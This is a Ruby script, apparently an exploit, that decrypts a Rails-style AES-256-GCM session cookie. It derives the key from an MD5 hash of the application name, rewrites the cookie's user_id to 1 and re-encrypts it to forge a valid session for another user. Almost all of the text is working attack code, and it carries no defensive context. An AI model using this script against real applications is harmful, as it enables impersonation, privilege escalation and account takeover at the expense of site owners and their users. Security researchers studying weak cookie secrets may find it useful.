require 'uri'
require 'openssl'
require 'base64'
require 'json'

cookie = URI.decode_www_form_component("insert session cookie here")

def secret
  secret_key = Digest::MD5.hexdigest("modify with application name:Application")
  OpenSSL::PKCS5.pbkdf2_hmac_sha1(secret_key, "authenticated encrypted cookie", 1000, 32)
end

encrypted_data, iv, auth_tag = cookie.split("--").map { |v| ::Base64.strict_decode64(v) }

cipher = OpenSSL::Cipher.new("aes-256-gcm")
cipher.decrypt
cipher.key = secret
cipher.iv = iv
cipher.auth_tag = auth_tag
cipher.auth_data = ""

decrypted_data = cipher.update(encrypted_data)
decrypted_data << cipher.final

puts "Decrypted Data:"
puts decrypted_data

#modify any existing variable, here user_id variable in the cookie is changed to 1
data = JSON.parse(decrypted_data)
data['user_id'] = 1

#update the cookie
puts "Updated Data:"
puts data

#encrypt the cookie with the secret token
cipher = OpenSSL::Cipher.new("aes-256-gcm")
cipher.encrypt
cipher.key = secret

iv = cipher.random_iv
cipher.auth_data = ""

encrypted_data = cipher.update(data.to_json)
encrypted_data << cipher.final
blob = "#{::Base64.strict_encode64(encrypted_data)}--#{::Base64.strict_encode64(iv)}--#{::Base64.strict_encode64(cipher.auth_tag)}"
#uri escape these characters: = / +
encoded_blob = blob.chars.map { |char| ['=', '/', '+'].include?(char) ? URI.encode_www_form_component(char) : char }.join


#print the new encoded_cookie
puts "Encoded Cookie:"
puts encoded_blob

